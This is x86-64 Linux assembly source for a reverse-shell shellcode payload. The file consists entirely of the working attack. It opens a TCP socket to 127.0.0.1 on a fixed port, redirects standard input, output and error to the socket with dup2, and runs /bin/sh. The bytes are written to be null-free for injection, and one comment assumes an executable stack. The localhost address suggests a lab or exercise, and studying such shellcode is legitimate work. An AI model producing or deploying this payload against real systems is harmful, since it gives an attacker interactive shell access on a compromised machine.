.global _start

.text
_start:
    jmp next
sh:
    .ascii "/bin/sh"
eol:
    .byte 0xff
sockaddr:
    #AF_INET
    .byte 2
    .byte 0xff
    .word 4391
    .long 0xffffffff
    .byte 127
    .byte 0
    .byte 0
    .byte 1
next:
    # socket(AF_INET, SOCK_STREAM, 0)
    # sys_socket
    xorl %eax, %eax
    movb $41, %al
    # AF_INET
    xorl %edi, %edi
    movb $2, %dil

    # SOCK_STREAM
    xorl %esi, %esi
    movb $1, %sil

    # no arguments
    xorl %edx, %edx
    syscall

    # connect(fd, &sockaddr, 16)
    # it could be assumed that the fd is less than 2 bytes long
    # move the socket to first argument
    movl %eax, %edi
    # sys_connect
    xorl %eax, %eax
    movb $42, %al
    leaq sockaddr(%rip), %rsi
    xorl %edx, %edx
    # put zeroes in sockaddr
    movq %rsi, %r8
    inc %r8
    movb %dl, (%r8)
    addq $3, %r8
    movl %edx, (%r8)
    # sizof(struct sockaddr)
    movb $16, %dl

    syscall
    # at this point rax could be -111 (connection refused)

    # dupd2(fd, 0)
    xorl %esi, %esi
    # sys_dup2
    xorl %eax, %eax
    movb $33, %al
    syscall

    movb $1, %sil
    xorl %eax, %eax
    movb $33, %al
    syscall

    movb $2, %sil
    xorl %eax, %eax
    movb $33, %al
    syscall

    xorl %eax, %eax
    # stack is executable, i can do this
    movb %al, eol(%rip)
    leaq sh(%rip), %rdi
    # sys_execve
    movb $59, %al
    xorl %edx, %edx
    xorl %esi, %esi
    syscall

    xorl %eax, %eax
    movb $60, %al
    xorl %edi, %edi
    syscall

